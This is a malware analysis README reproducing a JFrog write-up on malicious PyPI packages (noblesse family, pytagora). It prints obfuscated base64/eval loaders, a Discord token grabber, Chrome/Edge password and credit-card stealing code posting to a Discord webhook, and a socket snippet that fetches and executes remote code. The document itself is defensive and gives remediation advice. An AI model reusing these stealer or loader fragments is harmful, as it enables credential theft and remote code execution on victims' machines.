# pypi-maliciouspackage-review
### Revus de packages obfusqués mis en ligne sur le dépôt officiel du langage python: PyPi

| Package name | Maintainer | Payload |
| --- | --- | --- |
| noblesse | xin1111 | Discord token stealer, Credit card stealer (Windows-based) |
| genesisbot | xin1111 | Same as noblesse |
| aryi | xin1111 | Same as noblesse |
| suffer | suffer | Same as noblesse , obfuscated by PyArmor |
| noblesse2 | suffer | Same as noblesse |
| noblessev2 | suffer | Same as noblesse |
| pytagora | leonora123	 | Remote code injection |
| pytagora2 | leonora123 | Same as pytagora |

>Software package repositories are becoming a popular target for supply chain attacks. Recently, there has been news about malware attacks on popular repositories like npm, PyPI, and RubyGems. Developers are blindly trusting repositories and installing packages from these sources, assuming they are secure. Sometimes malware packages are allowed to be uploaded to the package repository, giving malicious actors the opportunity to use repositories to distribute viruses and launch successful attacks on both developer and CI/CD machines in the pipeline.

>As part of an ongoing effort by the JFrog security research team (formerly Vdoo) to automatically identify malicious packages, we are now reporting several Python packages hosted on PyPI as malicious. We have alerted PyPI about the existence of the malicious packages which promptly removed them. Based on data from pepy.tech, we estimate the malicious packages were downloaded about 30,000 times. We currently don’t have data about the actual impact caused by the use of these malicious packages.

>In this blog post, we will share the technical analysis of these packages and their impact.

Technical Analysis
Obfuscation Techniques
All of the above packages (and most novice Python malware) use a simple obfuscation technique of:

Encoding Python text with some simple encoder (ex. Base64)
Evaluating the decoded text as code, using eval
For example, the noblesse2 malware main code looks like this:

```py
import base64, codecs
magic = 'aW1wb3J0IGNvbG9yYW1hLCBkYXRldGltZS...'
love = '0iLKOcY3L4Y2q1nJkxpl97nJE9Y2EyoTI0M...'
god = 'a2luZy5hcHBlbmQodG9rZW4pDQogICAgICAg...'
destiny = 'yxIKAVDaAQK3xjpQWkqRAboUcBIzqjEmS...'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64...')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'','exec'))
```
(data was truncated for brevity)

This obfuscation can trick a simple static analysis tool, but doesn’t stand against a more thorough analysis, and actually raises a red flag that will make many researchers take a closer look at this code.

The specific (Nordic metal inspired?) strings used in the obfuscated code helped us to realize that the malware was simply processed with the public tool python-obfuscator.

The packages aryi and suffer were obfuscated using PyArmor, suggesting that malware developers are experimenting with different obfuscation methods.

## noblesse payload #1 – Stealing Discord auth tokens
The first payload of the noblesse “family” of malwares is stealing Discord authentication tokens. An authentication token allows the attacker to impersonate the user that originally held the token (similar to HTTP session cookies).

The payload stealing the tokens is based on the infamous dTGPG (Discord Token Grabber Payload Generator) payload. This is a generator tool that was never released publicly, but the payloads (the individualized token grabbers) are shared publicly, and some examples were also uploaded to Github.

The Discord auth token stealer code is extremely simple, it iterates a hardcoded set of paths:
```py
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

paths = {
    'Discord': roaming + '\\Discord',
    'Discord Canary': roaming + '\\discordcanary',
    'Discord PTB': roaming + '\\discordptb',
    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
    'Opera': roaming + '\\Opera Software\\Opera Stable',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
}
```
and then simply reads all .log and .ldb files under these paths (specifically under Local Sotrage\leveldb) and looks for Discord authentication tokens, which looks like this:

`AhDDanSZFkkf2j2J8co2d5Tn.G2rsTL.ZP2E7xR3AiapA8oNmgyqsao0Fj1 (Single-factor token – 24 chars + ‘.’ + 6 chars + ‘.’ + 27 chars)`
`mfa.zmDGLWt6FVZVIjc5Xo25luPYVTRWqPryLQUVOjN0kIzZ5uzWQ1fbHyiaTNj0sQ3j4cLSB7XibGzPaUHEc3mO (Multi-factor token – “mfa.” + 84 chars)`
The results are uploaded to Discord via a Webhook (an easy way to get automated messages and data updates sent to a text channel on a private server) with the following parameters:
```py
{
  "type": 1,
  "id": "807327703082074143",
  "name": "Captain Hook",
  "avatar": null,
  "channel_id": "725001140324008047",
  "guild_id": "720931953251057725",
  "application_id": null,
  "token": "uwAgm7PQaROJB3USUNDv1RT7uJzfidUsHBsC_y0p2qtChlzNVgpG1vw2zAtkFX-8Xq-x"
}
```
## noblesse payload #2 – Stealing Autocomplete sensitive data (credit cards and passwords)
The second payload of the noblesse family is an “Autocomplete” information stealer. All modern browsers support saving passwords and credit card information for the user:

Browser support for saving passwords and credit card information

This is very convenient, but the downside is that this information can be leaked by malicious software that got access to the local machine.

In this case, the malware tries to steal credit card information from Chrome:
```py
def cs():
    master_key = master()
    login_db = os.environ['USERPROFILE'] + os.sep + \
        r'AppData\Local\Google\Chrome\User Data\default\Web Data'
    shutil.copy2(login_db,
                 "CCvault.db")
    conn = sqlite3.connect("CCvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT * FROM credit_cards")
        for r in cursor.fetchall():
            username = r[1]
            encrypted_password = r[4]
            decrypted_password = dpw(
                encrypted_password, master_key)
            expire_mon = r[2]
            expire_year = r[3]
            hook.send(f"CARD-NAME: " + username + "\nNUMBER: " + decrypted_password + "\nEXPIRY M: " + str(expire_mon) + "\nEXPIRY Y: " + str(expire_year) + "\n" + "*" * 10 + "\n")
```
And additionally, steal saved password and credit card information from Edge (truncated for brevity):
```py
login_db = os.environ['USERPROFILE'] + os.sep + r'\AppData\Local\Microsoft\Edge\User Data\Profile 1\Login Data'
...
cursor.execute("SELECT action_url, username_value, password_value FROM logins")
decrypted_password = dpw(encrypted_password, master_key)
if username != "" or decrypted_password != "":
	hook.send(f"URL: " + url + "\nUSER: " + username + "\nPASSWORD: " + decrypted_password + "\n" + "*" * 10 + "\n")
  ```
The information is uploaded to the same Webhook that was previously mentioned.

## noblesse payload #3 – System information gathering
The third payload of the noblesse family gathers the following information about the victim’s system, and uploads it to the mentioned Webhook:

IP address
Computer name
User name
Windows license key information (wmic path softwarelicensingservice get OA3xOriginalProductKey)
Windows version (wmic os get Caption)
Screenshot image (by using Pillow’s ImageGrab)
pytagora – Remote code injection
The 2nd malware family that was researched is much more simple.

Under the interesting pretense of “Make pytagora theorem easy” (sic) this is the entirety of the package’s code:
```py
import math
import base64,sys
def hello():
	exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdHJ1Y3Qs...'))
def hypotenuse(a,b):
	hello()
	c = math.sqrt(math.pow(a,2) + math.pow(b,2))
	return round(c,2)
def other(c,x):
	y = math.sqrt(math.pow(c,2)-math.pow(x,2))
	return round(y,2)
  ```
The bit of obfuscated code is decoded into this snippet:
```py
import socket,struct,time
s=socket.socket(2,socket.socket.socket.SOCK_STREAM)
s.connect(('172.16.60.80',9009))
l=struct.unpack('>I',s.recv(4))[0]
print (l)
d=s.recv(l)
print (d)
while len(d)>!1:
d+=s.recv(l-len(d))
print (d)
exec(d,{'s':s})
```
To be succinct – the malware tries to connect to a private IP address on TCP port 9009, and then execute whatever Python code is read from the socket.

What Should You Do?
Tips for affected developers
​If, after checking your PyPI dependencies, you have identified that noblesse (or any of its clones) has been locally installed, we suggest:

​Checking which passwords were saved in Edge, and changing these compromised passwords in each respective website (plus any websites where these passwords were reused).The check can be performed by opening Edge and navigating to edge://settings/passwords. The full list of saved passwords (which were potentially compromised) can be seen under Saved passwords.
Checking which credit cards were saved in Chrome and consider canceling these credit cards.The check can be performed by opening Chrome and navigating to chrome://settings/payments. The full list of saved credit cards (which were potentially compromised) can be seen under Payment methods.
​If you have identified that pytagora (or any of its clones) has been locally installed on your machine, while unlikely that you were infected with malware, we suggest following the usual malware checking steps, such as running a full scan with your installed Anti-Virus software.

Summary
As we have also seen in our previous PyPI research, lack of moderation and automated security controls in public software repositories allow even inexperienced attackers to use them as a platform to spread malware, whether through typosquatting, dependency confusion, or simple social engineering attacks.

Almost all of the code snippets analyzed in this research were based on known public tools, with only a few parameters changed. The obfuscation was also based on public obfuscators.

We expect to see more of these “Frankenstein” malware packages stitched from different attack tools (with changed exfiltration parameters). We will continue to monitor public package repositories to sanitize such instances.

##### © 2021 JFrog Ltd All Rights Reserved
